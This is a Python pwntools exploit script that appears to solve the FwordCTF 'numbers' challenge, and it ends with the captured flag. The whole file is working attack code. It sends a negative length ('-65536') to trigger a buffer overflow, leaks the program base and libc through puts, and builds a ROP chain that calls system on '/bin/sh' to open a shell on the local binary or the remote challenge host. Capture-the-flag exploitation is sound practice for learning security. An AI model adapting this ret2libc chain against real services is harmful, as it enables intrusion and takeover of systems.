from pwn import *


local = 1 

if local == 1 :
    p = process("./numbers")
    puts_offset = 0x80a30
    system = 0x4f4e0
    bin = 0x1b40fa
    one_gadget = [0x4f365,0x4f3c2,0x10a45c]
else : 
    p = remote("numbers.fword.wtf",1237)
    puts_offset = 0x081010
    system = 0x050300
    bin = 0x1aae80
    one_gadget = [0x4f365,0x4f3c2,0x10a45c]

# payload = str(0xffffff)

code_offset = 0x8e9
puts_got_offset = 0x200fa0
puts_plt_offset = 0x720
pr = 0x0ad3 # pop rdi ; ret
ppr = 0xad1 # pop rsi ; pop r15 ; ret
ret = 0x9c5

payload = "60aaaaaa"
p.sendafter("mind ??",payload)
payload2 = "b"*24

p.sendafter("sure ??",payload2)
p.recvline()

codebase = u64(p.recvline()[-7:-1]+"\x00\x00") - 0x8e9
log.info ( hex(codebase) )

puts_got = codebase + puts_got_offset
puts_plt = codebase + puts_plt_offset
pr = codebase + pr
ppr = codebase + ppr
ret = codebase + ret


p.sendafter("try again ?","a")

payload = "-65536"
p.sendafter("mind ??",payload)

payload2 = "c"*0x48
payload2 += p64(pr)
payload2 += p64(puts_got)
payload2 += p64(puts_plt)
payload2 += p64(ret)

p.sendlineafter("sure ??",payload2)
p.recvline()

libc = u64((p.recvline()[-7:-1])+"\x00\x00") - puts_offset
one = libc + one_gadget[0]
system = libc+system
bin = libc+bin

log.info( hex(libc) )

payload = "-65536"
pause()
p.sendafter("mind ??",payload)

payload2 = "d"*0x48
payload2 += p64(ppr)
payload2 += p64(0)
payload2 += p64(0)
payload2 += p64(pr)
payload2 += p64(bin)
payload2 += p64(system)

p.sendlineafter("sure ??",payload2)



p.interactive()

#FwordCTF{s1gN3d_nuMb3R5_c4n_b3_d4nG3r0us}